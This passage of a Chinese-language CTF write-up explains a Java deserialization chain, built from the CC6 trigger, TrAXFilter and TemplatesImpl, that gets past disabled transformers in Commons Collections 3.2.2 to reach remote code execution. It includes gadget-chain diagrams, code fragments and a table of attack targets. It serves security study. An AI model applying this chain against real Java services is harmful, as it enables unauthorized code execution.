-1. **Runtime的限制**：
-
-```java
-public class Runtime {
-    private Runtime() {}  // 构造器是private的！
-    
-    public static Runtime getRuntime() { ... }  // 需要通过静态方法获取实例
-    
-    public Process exec(String command) { ... }  // 需要先获取实例再调用
-}
-```
-
-- Runtime的构造器是private的，无法通过`new Runtime()`创建
-- 必须先调用`Runtime.getRuntime()`获取实例
-- 然后才能调用`exec()`方法
-
-1. **执行流程对比**：
-
-```java
-// ❌ 无法实现 - Runtime.exec()需要两步
-myexpect.setTargetclass(Runtime.class);  // 构造器private，无法调用
-// 即使能获取实例，也无法调用exec()方法（Myexpect只调用构造器）
-
-// ✅ 可以实现 - TrAXFilter在构造器中触发
-myexpect.setTargetclass(TrAXFilter.class);
-myexpect.setTypeparam(new Class[]{Templates.class});
-myexpect.setTypearg(new Object[]{templates});
-// 调用: new TrAXFilter(templates)
-// 构造器内部自动调用 templates.newTransformer() → 加载字节码 → RCE
-```
-
-4. **TrAXFilter的优势**：
-
-```java
-// TrAXFilter构造器源码
-public TrAXFilter(Templates templates) throws TransformerConfigurationException {
-    _templates = templates;
-    _transformer = templates.newTransformer();  // 构造器中就触发！
-}
-```
-
-TrAXFilter的构造器会自动调用`templates.newTransformer()`，完美适配Myexpect只能调用构造器的限制。
-
-**可选的攻击目标**：
-
-虽然不能用Runtime.exec()，但还有其他选择：
-
-| 攻击目标 | 触发方式 | 优点 | 缺点 |
-|---------|---------|------|------|
-| TrAXFilter → TemplatesImpl | 构造器触发 | ✅ 隐蔽、绕过安全管理器 | 需要字节码 |
-| ProcessBuilder → start() | ❌ 需要调用方法 | 直观 | ❌ Myexpect不支持 |
-| ScriptEngineManager | 构造器触发 | 可执行脚本 | 依赖nashorn |
-| JNDI注入相关类 | 构造器触发 | 远程加载 | 需要外部服务 |
-
-**结论**：MyPOC选择TrAXFilter → TemplatesImpl是因为：
-
-- ✅ 适配Myexpect只能调用构造器的限制
-- ✅ 在构造器中就能触发恶意代码
-- ✅ 不依赖SecurityManager配置
-- ✅ 字节码加载更隐蔽
-
-#### 3. 绕过安全检查：关键创新
-
-| 传统方法 | 状态 | 改造方法 | 状态 |
-|---------|------|---------|------|
-| InstantiateTransformer | ❌ 禁用 | Myexpect.getAnyexcept() | ✅ 可用 |
-| InvokerTransformer | ❌ 禁用 | Myexpect.getAnyexcept() | ✅ 可用 |
-| 直接调用 | - | JSONObject触发getter | ✅ 创新 |
-
-#### 4. 利用链组合
-
-```
-CC6的触发器 + CC3的攻击目标 + 自定义绕过 = MyPOC
-```
-
----
-
-### 触发方式选择：为什么使用CC6？
-
-**CC6的触发机制**：
-
-```
-HashMap.readObject()
-  → hash(key)  
-  → TiedMapEntry.hashCode()
-  → TiedMapEntry.getValue()
-  → LazyMap.get(key)
-  → transform(key)
-```
-
-**选择CC6的原因**：
-
-1. **JDK兼容性最好**
-   - HashMap反序列化机制是Java基础功能
-   - 不依赖特定JDK版本的实现细节
-   - CC1、CC3等用到的AnnotationInvocationHandler在JDK 8u71+后对memberValues类型进行安全检查而失效
-
-2. **触发稳定可靠**
-   - HashMap.readObject()必然调用hash(key)
-   - 不像CC1/CC3中的TransformedMap需要key为"value"才能触发（因为@Retention注解只有value()成员方法）
-
----
-
-### 核心要点
-
-1. **题目约束**: CC 3.2.2禁用了`InvokerTransformer`和`InstantiateTransformer`
-2. **突破方法**: 利用题目提供的`Myexpect`类替代危险Transformer
-3. **触发机制**: Hutool JSON序列化时自动调用getter方法`getAnyexcept()`
-4. **利用链**: HashMap → TiedMapEntry → LazyMap → ConstantTransformer → Myexpect → TrAXFilter → TemplatesImpl
-
-### 关键技术
-
-- **反射调用构造器**: `Myexpect.getAnyexcept()`
-- **LazyMap延迟加载**: 访问不存在的key触发transform
-- **TemplatesImpl字节码加载**: 静态代码块执行命令
-- **时序控制**: 先put后remove再替换，确保反序列化时正确触发
-
